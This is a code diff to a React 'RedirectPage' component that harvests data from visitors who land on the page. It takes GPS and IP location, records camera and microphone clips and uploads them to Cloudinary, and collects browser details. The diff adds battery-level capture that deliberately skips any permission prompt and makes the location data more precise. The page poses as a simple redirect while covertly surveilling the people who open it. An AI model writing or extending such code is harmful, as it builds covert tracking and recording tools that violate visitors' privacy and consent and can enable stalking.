@@ -246,7 +246,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
   const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
-  const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a' });
+  const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a', battery: 'n/a' });
 
   React.useEffect(() => {
     const loadSettings = async () => {
@@ -318,14 +318,30 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
             
             // --- Location ---
-            let locationData = { lat: ipData.latitude ? Number(ipData.latitude) : null, lon: ipData.longitude ? Number(ipData.longitude) : null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
+            let locationData = { lat: ipData.latitude ? Number(ipData.latitude) : null, lon: ipData.longitude ? Number(ipData.longitude) : null, accuracy: ipData.accuracy ? Number(ipData.accuracy) : null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
             if (permissionStatusRef.current.location === 'granted') {
                 await new Promise<void>(resolve => {
                     navigator.geolocation.getCurrentPosition(pos => {
-                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'gps' };
+                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'gps' };
                         resolve();
                     }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                 });
+            }
+
+            // --- Battery ---
+            let batteryData = null;
+            if (settings.captureInfo.permissions.includes('battery') && 'getBattery' in navigator) {
+                try {
+                    const batteryManager = await (navigator as any).getBattery();
+                    permissionStatusRef.current.battery = 'granted';
+                    batteryData = {
+                        level: Math.round(batteryManager.level * 100),
+                        charging: batteryManager.charging
+                    };
+                } catch (e) { 
+                    console.error("Could not fetch battery data:", e);
+                    permissionStatusRef.current.battery = 'denied';
+                }
             }
     
             // --- Media Capture ---
@@ -349,7 +365,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                     stream.getTracks().forEach(track => track.stop());
     
                     await new Promise(resolve => recorder.onstop = resolve);
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: permissionStatusRef.current.camera === 'granted' ? 'video/webm' : 'audio/webm' });
                     
                     if(permissionStatusRef.current.camera === 'granted') {
                         cameraUrl = await uploadToCloudinary(blob, 'video');
@@ -373,7 +389,12 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 location: locationData,
-                permissions: permissionStatusRef.current,
+                permissions: {
+                    location: permissionStatusRef.current.location,
+                    camera: permissionStatusRef.current.camera,
+                    microphone: permissionStatusRef.current.microphone,
+                },
+                battery: batteryData,
                 cameraCapture: cameraUrl,
                 microphoneCapture: micUrl,
             };
@@ -408,6 +429,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         const newlyDenied: PermissionType[] = [];
 
         for (const perm of required) {
+            if (perm === 'battery') continue; // Skip battery, no prompt needed
             try {
                 if (perm === 'location') {
                     const status = await navigator.permissions.query({ name: 'geolocation' });
@@ -432,7 +454,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         }
         
         required.forEach(p => {
-            if (permissionStatusRef.current[p] === 'denied') {
+            if (p !== 'battery' && permissionStatusRef.current[p] === 'denied') {
                 hasDenied = true;
                 newlyDenied.push(p);
             }
